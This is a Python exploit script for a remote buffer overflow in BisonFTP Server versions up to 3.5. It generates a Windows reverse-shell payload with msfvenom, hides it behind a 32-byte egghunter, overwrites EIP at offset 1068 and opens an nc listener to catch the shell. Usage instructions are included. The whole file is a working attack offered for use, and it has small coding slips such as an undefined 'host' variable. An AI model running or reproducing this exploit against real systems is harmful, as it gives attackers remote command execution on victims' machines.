#!/usr/bin/python
# -*- coding: iso-8859-15 -*-

import subprocess,socket,time,sys,os

bdr = (( "☠️" * 69) + "\r\n")
try:
    poc    = str(sys.argv[0])
    target = str(sys.argv[1])
    port   = int(sys.argv[2])
    lhost  = str(sys.argv[3])
    lport  = str(sys.argv[4])
    
except IndexError:
    print(  bdr +
            "[+] BisonFTP Server <=v3.5 Remote EIP Overwrite BOF Egghunter Exploit\x0a"
            "[+] Auto Reverse TCP Shell Version by 3mrgnc3\x0a"
            "[+] Tested on Windows 7 Pro x86 6.1.7601 Service Pack 1 Build 7601\x0a"
            "[+] Use: " + poc + " <rhost> <rport> <lhost> <lport>\x0a"
            "[+] e.g. " + poc + " 172.16.0.31 21 172.16.0.18 666\x0a"
          + bdr
         )
    sys.exit()
    
# =============================================
mksh  = (
"msfvenom -p windows/shell_reverse_tcp"
" --platform windows"
" LHOST="
+ lhost +
" LPORT="
+ lport +
" -f python "
" -a x86"
" -o RevPld.py"
)
#===============================================

try:
    print "[+] Attempting To Generate Reverse Shell Payload ..."
    vnm = subprocess.Popen(mksh.split(), stdout=subprocess.PIPE)
    vnm.wait()
    print "[+] Reverse Shell Payload Generated Successfully..."
except IndexError:    
    print "[!] ERROR: Couldn't Generate Payload "
    sys.exit(-1)

from RevPld import buf as pld

# EIP Overwrite @ offset 1068 Bytes

shl  = ("3gg3" * 2)
shl += (pld)
egh  = ("\x66\x81\xca\xff"  # 32 Byte EggHunter
        "\x0f\x42\x52\x6a"  # egg = '3gg3'
        "\x02\x58\xcd\x2e"
        "\x3c\x05\x5a\x74"
        "\xef\xb8\x33\x67"
        "\x67\x33\x8b\xfa"
        "\xaf\x75\xea\xaf"
        "\x75\xe7\xff\xe7"
        )

buf  = (shl)
buf += ("A" * (1068-len(shl+egh)))
buf += (egh)
ofs  = (len(buf))
buf += ("\x09\x01\x43\x00") # 00430109 CALL EBX Bisonftp.exe
pad  = ("C" * (1100-len(buf)))

try:
    print("\r[+] Listening For Incomming Connection...")
    lnr = ("nc -s "+lhost+" -lp "+lport)
    ncl = subprocess.Popen(lnr, shell=True)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(6)
    s.recv(1024)
    s.send("☠️")
    time.sleep(2)
    s.recv(1024)
    s.close()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(6)
    s.recv(1024)
    s.send(buf+pad)
    time.sleep(2)
    s.recv(1024)
    ncl.poll()
    ncl.wait()
    raise KeyboardInterrupt
except IOError:
    print("[!] ERROR! Failed to connect to FTP Server..")
    sys.exit(1)
except:
    print("\r[!] Shell Terminated!")
    subprocess.call("rm -rf RevPld*", shell=True)
    sys.exit()



